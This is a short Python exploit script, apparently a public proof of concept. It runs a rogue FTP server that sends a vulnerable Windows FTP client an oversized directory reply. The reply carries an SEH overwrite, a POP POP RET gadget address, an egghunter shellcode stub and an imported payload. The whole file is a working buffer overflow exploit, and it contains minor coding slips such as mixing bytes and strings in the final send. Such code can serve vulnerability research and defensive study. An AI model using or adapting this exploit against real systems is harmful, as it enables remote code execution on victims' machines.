#!/usr/bin/python
 

 
#Author website: www.tulpa-security.com
#Author twitter: @tulpa_security
 
#Tested on Windows Vista x86
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):


#badchars \x00\x10\x0a

       

        egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        egghunter += b"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

        egg = b"w00tw00t"

        nseh = b"\x90\x90\xEB\x05" #JMP over SEH
        seh = b"\xF8\x54\x01\x68" #POP POP RET 680154F8 in WCMDPA10.DLL

        buffer = b"A" * 100 + egg + b"\x90" * 10 + buf + b"D" * (9266-len(buf)) + nseh + seh + egghunter + b"C" * 576

        port = 21

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind((target_machine, target_port))
                s.listen(5)
                print("[i] Evil FTP server started on port: "+str(port)+"\r\n")
        except:
                print("[!] Failed to bind the server to port: "+str(port)+"\r\n")

        while True:
                conn, addr = s.accept()
                conn.send(b'220 Welcome to your unfriendly FTP server\r\n')
                print(conn.recv(1024))
                conn.send(b"331 OK\r\n")
                print(conn.recv(1024))
                conn.send(b'230 OK\r\n')
                print(conn.recv(1024))
                conn.send(b'220 "'+buffer+'" is current directory\r\n')